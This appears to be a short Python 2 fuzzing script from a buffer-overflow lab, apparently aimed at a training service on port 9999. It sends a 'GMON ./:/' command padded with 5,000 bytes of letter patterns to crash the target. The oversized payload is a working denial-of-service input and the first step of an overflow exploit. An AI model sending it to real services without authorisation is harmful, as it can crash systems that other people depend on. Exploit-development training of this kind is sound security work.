#!/usr/bin/env python
"""
📡 Network Fuzzer
Sends massive patterns to a network service to find crashes. 💥
Targeting port 9999 by default (GMON command).
"""

import sys
import socket
import time

def start_fuzzing():
    # 🎯 Default Target
    ip_addr = "192.168.1.104"
    ip_port = 9999
    
    # Override from command line args
    if len(sys.argv) >= 3:
        ip_addr = sys.argv[1]
        ip_port = int(sys.argv[2])
    
    print "\n🤖 Network Fuzzer Initialized!"
    print "   🎯 Target: " + ip_addr + ":" + str(ip_port)

    try:
        # 📦 Construct Evil Payload
        # GMON ./:/AAAAAAAA...BBBBBBBB...
        command = "GMON ./:/"
        command += "A" * 1000
        command += "B" * 1000
        command += "C" * 1000
        command += "D" * 1000
        command += "E" * 1000
        
        print "   📏 Payload Length: " + str(len(command)) + " bytes"
        
        # 🔌 Connect
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_addr, ip_port))
        
        # 📨 Handshake
        banner = s.recv(1024)
        print "   👋 Banner: " + banner.strip()
        
        # 🚀 Launch Payload
        print "   🚀 Sending Payload..."
        s.send(command)
        
        # 👂 Check for survival
        response = s.recv(1024)
        print "   ✅ Response: " + response.strip()
        
        s.close()
        
    except Exception as ex:
        print "   ❌ Exception (Service might have crashed!): " + str(ex)

if __name__ == "__main__":
    start_fuzzing()
